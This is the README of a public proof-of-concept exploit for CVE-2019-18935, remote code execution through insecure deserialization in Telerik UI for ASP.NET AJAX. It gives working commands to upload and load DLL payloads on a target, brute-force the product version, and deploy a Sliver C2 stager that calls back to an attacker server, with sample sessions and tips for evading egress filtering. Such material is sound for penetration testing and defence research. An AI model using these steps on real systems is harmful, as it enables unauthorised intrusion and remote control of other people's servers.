# CVE-2019-18935

Proof-of-concept exploit for a .NET JSON deserialization vulnerability in Telerik UI for ASP.NET AJAX allowing remote code execution.

<div align="center">
    <img src="https://know.bishopfox.com/hubfs/Bishop-Fox_Blog-Post_Telerik_FI_frame.png" width="300px" />
</div>

## Description

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. For more information, see:
- The DerpCon talk [.NET Roulette](https://www.youtube.com/watch?v=--6PiuvBGAU) ([slides](https://know.bishopfox.com/cs/c/?cta_guid=80aa4ac9-84b9-45a4-9cf3-9f215e3f714a&placement_guid=f9ff0e1a-d44c-42ce-8be3-480356af7dc7&portal_id=5632775&canon=https%3A%2F%2Fknow.bishopfox.com%2Fevents%2Fbarrett-darnell-to-present-at-derpcon&redirect_url=APefjpGudybbT_RflCPD6bnEJCJeiyJQwOw2sIK_LZsJpPzGa3E7Q0zgcY2tAhXlkopDbQCzU_G0nEWApdZDnvmHG0BXZdg3RVqaDZTM7kRj-B-MgSRZtZf3sBb_IpKbpAYruI5qNjK-squ1hOQ-Ubq5hoeoYk8B_kwsDSuP7dyoJA5jUMpOdLd6GMURDLATA5GJfm0sOzClndse_fbJg10zBRMQ-byd_ikGcy3ttuQMBRJXkKHPCDFTMp5tODRK66YwFDGfL16GHjOiKLim0ORMvYzyCjOr6RS0qMUDfRbywQIcMWrd7hKI7XiphcZOXf7JcsstSrHn&click=a3983a0a-2932-41a5-b67f-deb4eee8a399&hsutk=2fd63671b84547f0be515dffcd468a6e&signature=AAH58kGXBfVBLDcwiB-xjb6tdRfjxsQXSw&pageId=28318760929&contentType=blog-post&__hstc=24978341.2fd63671b84547f0be515dffcd468a6e.1592575907261.1592575907261.1592575907261.1&__hssc=24978341.1.1592575907263&__hsfp=1563242614)) which details extra fundamentals about exploiting insecure deserialization, applies that to this exploit, and walks through some tips and tricks for getting shells on ASP.NET web applications.
- The [full write-up](https://hubs.ly/H0mfk7r0) at Bishop Fox, including a complete walkthrough of this vulnerability and exploit details for this issue (along with patching instructions).

## Getting started

### Prerequisites

You'll need [Visual Studio](https://visualstudio.microsoft.com/downloads/) and [.NET Framework SDK](https://dotnet.microsoft.com/download/visual-studio-sdks#:~:text=NET%20Standard%20article.-,.NET%20Framework,-.NET%20Framework%20is) installed to compile mixed-mode .NET assembly DLL payloads using `build-dll.bat`.

### Install

```bash
git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
python3 -m venv env
source env/bin/activate
python3 -m pip install -U pip
python3 -m pip install -r requirements.txt
```

This exploit leverages encryption logic from [RAU\_crypto](https://github.com/bao7uo/RAU_crypto). The `RAUCipher` class within `RAU_crypto.py` depends on PyCryptodome, a drop-in [replacement](https://blog.sqreen.com/stop-using-pycrypto-use-pycryptodome/) for the [dead](https://github.com/dlitz/pycrypto/issues/238) PyCrypto module. PyCryptodome and PyCrypto create problems when installed in the same environment, so the best way to satisfy this dependency is to install the module within a virtual environment, as shown above.

### Configure

Point [line 17](https://github.com/noperator/CVE-2019-18935/blob/master/build-dll.bat#L17) of `build-dll.bat` to the path of your Visual Studio installation.

```vbscript
set VSPATH=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build
```

### Usage

```
$ python3 CVE-2019-18935.py -h
usage: CVE-2019-18935.py [-h] [-t] [-d] [-r FILENAME_REMOTE] [-s SMB_SERVER]
                         [-v UI_VERSION] [-n NET_VERSION] [-p PAYLOAD]
                         [-f FOLDER] -u URL

Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in
Telerik UI for ASP.NET AJAX.

optional arguments:
  -h, --help          show this help message and exit
  -t                  just upload a file
  -d                  just deserialize
  -r FILENAME_REMOTE  remote payload name, for optional use with -d
  -s SMB_SERVER       remote SMB server, for optional use with -d
  -v UI_VERSION       software version
  -n NET_VERSION      .NET version
  -p PAYLOAD          mixed mode assembly DLL
  -f FOLDER           destination folder on target
  -u URL              https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau
```

#### Compile mixed mode .NET assembly DLL payload

Some payloads (e.g., `reverse-shell.c` and `sliver-stager.c`) require you to set the `HOST` and `PORT` fields to point to your C2 server—be sure to do that!

In a Windows environment with Visual Studio installed, use `build-dll.bat` to generate 32- and 64-bit mixed mode assembly DLLs to be used as a payload during deserialization. You may optionally specify a target CPU architecture as a second CLI argument (e.g., `x86`).

```vbscript
build-dll.bat sleep.c
```

#### Upload payload to target, and load payload into application

Pass the DLL generated above to `CVE-2019-18935.py`, which will upload the DLL to a directory on the target server (provided that the web server has write permissions in that directory) and then load that DLL into the application via the insecure deserialization exploit.

```
$ python3 CVE-2019-18935.py -v <VERSION> -p payloads/sleep-2019121205271355-x86.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
[*] Local payload name:  sleep-2019121205271355-x86.dll
[*] Destination folder:  C:\Windows\Temp
[*] Remote payload name: 1576142987.918625.dll

{'fileInfo': {'ContentLength': 75264,
              'ContentType': 'application/octet-stream',
              'DateJson': '1970-01-01T00:00:00.000Z',
              'FileName': '1576142987.918625.dll',
              'Index': 0},
 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',
              'TempFileName': '1576142987.918625.dll'}}

[*] Triggering deserialization...

<title>Runtime Error</title>
<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds
```

In the example above, the application took at least 10 seconds to respond, indicating that the DLL payload successfully invoked `Sleep(10000)`.

#### Brute-force Telerik UI version

As detailed in the DerpCon talk [.NET Roulette (39:46)](https://youtu.be/--6PiuvBGAU?t=2386), we can brute-force the Telerik UI version by specifying only the _major_ version of the `Telerik.Web.UI` assembly (i.e., the `2017` portion of the full version string `2017.2.503.40`) when uploading a file. This technique drastically reduces the search space when compared to brute-forcing each specific release of this software—and, as an added benefit, it can even detect versions that aren't explicitly listed in the [release history](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history) for this software. Learn more about .NET assembly versioning on [MSDN](https://docs.microsoft.com/en-us/dotnet/api/system.version#remarks).

```
$ for YEAR in $(seq 2013 2018); do
    echo -n "$YEAR: "
    python3 CVE-2019-18935.py -t -v "$YEAR" -p /dev/null -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null |
    grep -oE "Telerik.Web.UI, Version=$YEAR\.[0-9\.]+" ||
    echo
done

2013:
2014:
2015:
2016:
2017: Telerik.Web.UI, Version=2017.2.503.40
2018:
```

#### Implant with Sliver C2 framework

The custom [Sliver](https://github.com/BishopFox/sliver) stager payload [`sliver-stager.c`](sliver-stager.c) receives and executes Sliver shellcode (the stage) from the Sliver server (the staging server), following Metasploit's staging protocol. For more details on how this works, read the header in the payload source.

Start Sliver server. More info on server setup [here](https://github.com/BishopFox/sliver/wiki/Getting-Started).

```bash
MINGW_PATH='/usr/bin'  # Or wherever MinGW is located.
export SLIVER_CC_32="$MINGW_PATH/i686-w64-mingw32-gcc"
export SLIVER_CC_64="$MINGW_PATH/x86_64-w64-mingw32-gcc"
./sliver-server
```

Open C2 endpoint (we're using an mTLS listener here, but you can also use HTTP or DNS) on Sliver server, create an implant profile, and create a staging listener linked to that profile. More info on staged payloads [here](https://github.com/BishopFox/sliver/wiki/Stagers#example). Note that we're not generating a Sliver stager using `generate stager` as Sliver's documentation suggests; we're instead using our custom [`sliver-stager.c`](sliver-stager.c).

⚠️ Warning: Sending a stage of the wrong CPU architecture will _crash_ the target process! For example, if the target is running a 32-bit version of Telerik UI and the staging server sends a 64-bit stage to the 32-bit stager, the web server process will crash. In the following example, we generate 32-bit shellcode—but you must match that to your target's CPU architecture using the `new-profile` command's `--arch` flag.

```
sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > new-profile --mtls <C2-ENDPOINT>:<PORT> --arch x86 --format shellcode --profile-name shellcode-32 --skip-symbols
[*] Saved new profile shellcode-32

sliver > stage-listener --url tcp://<STAGING-SERVER>:<PORT> --profile shellcode-32
[*] No builds found for profile shellcode-32, generating a new one
[*] Job 2 (tcp) started
```

Set the host and port in the Sliver stager source to point to the Sliver server (showing an example server below).

```
sed -Ei .bu 's/<HOST>/sliverserver.bishopfox.com/; s/<PORT>/443/' sliver-stager.c
```

Compile the Sliver stager payload, and upload the payload to the target and load it into the application (all according to the preceding Usage sections in this README).

```
> .\build-dll.bat sliver-stager.c x86

$ python3 CVE-2019-18935.py -v 2017 -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -p payloads/sliver-stager-2020080514261722-x86.dll
```

If all goes well (have you [troubleshat](#Troubleshooting) this target?), you'll see a session created in your Sliver server window that you can use to interact with the target.

```
[*] Session #1 AFRAID_COMPUTER - <REMOTE-ADDRESS> (DESKTOP-D19S4Q2) - windows/386 - Wed, 05 Aug 2020 15:58:27 UTC

sliver > use 1

[*] Active session AFRAID_COMPUTER (1)

sliver (AFRAID_COMPUTER) > help

Commands:
=========
  clear  clear the screen
  exit   exit the shell
  help   use 'help [command]' for command help
  ...
  whoami             Get session user execution context

sliver (AFRAID_COMPUTER) > whoami

DESKTOP-D19S4Q2\tester
```

### Troubleshooting

- Each payload only works once—the .NET `AssemblyInstaller` class cannot load multiple .NET assemblies having the same assembly name (different from a _filename_). You'll need to compile and upload a new one each time you want the target to sleep, call back, etc.
- Ensure you're targeting the right CPU architecture (32- or 64-bit). This may take some guesswork; the sleep payload is useful here.
- Beware egress filtering rules on the target network when trying to initiate a reverse TCP connection back to your C2 server. Choose a commonly allowed TCP port, like 443.

## Back matter

### Legal disclaimer

Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

### Acknowledgements

[@mwulftange](https://twitter.com/mwulftange) initially [discovered](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) this vulnerability. [@bao7uo](https://github.com/bao7uo) wrote all of the logic for [breaking RadAsyncUpload encryption](https://github.com/bao7uo/RAU_crypto), which enabled manipulating the file upload configuration object in `rauPostData` and subsequently exploiting insecure deserialization of that object. [@lesnuages](https://github.com/lesnuages) wrote the first iteration of the Sliver stager payload.

### See also

#### Government advisories

- 28 Jul 2021: [CISA | Top Routinely Exploited Vulnerabilities](https://us-cert.cisa.gov/sites/default/files/publications/AA21-209A_Joint%20CSA_Top%20Routinely%20Exploited%20Vulnerabilities.pdf)
- 20 Oct 2020: [NSA | Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities](https://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF)
- 19 Jun 2020: [ACSC | Copy-Paste Compromises – tactics, techniques and procedures used to target multiple Australian networks](https://www.cyber.gov.au/sites/default/files/2020-12/ACSC-Advisory-2020-008-Copy-Paste-Compromises.pdf)
- 22 May 2020: [ACSC | RCE vulnerability being actively exploited in vulnerable versions of Telerik UI by sophisticated actors](https://www.cyber.gov.au/sites/default/files/2020-05/ACSC-Advisory-2020-004-Targeting-of-Telerik-CVE-2019-18935.pdf)

#### Bug bounty write-ups

- [HackerOne Report #1174185](https://hackerone.com/reports/1174185) ([@un4gi](https://twitter.com/un4gi_io))
- [HackerOne Report #838196](https://hackerone.com/reports/838196) ([@sw33tLie](https://twitter.com/sw33tLie))
- [HackerOne Report #913695](https://hackerone.com/reports/913695) ([@un4gi](https://twitter.com/un4gi_io))

### To-do

- [x] Add payload to upload and execute [Sliver](https://github.com/BishopFox/sliver) implant
- [ ] Adjust C payload to optionally run a single command, rather than opening an interactive shell
- [ ] Modify the assembly name of already compiled DLL to avoid recompiling for the same target
- [x] Demonstrate brute-forcing major Telerik UI versions (i.e., the _year_ portion of the version string)

### License

This project is licensed under the [Apache License](LICENSE.md).
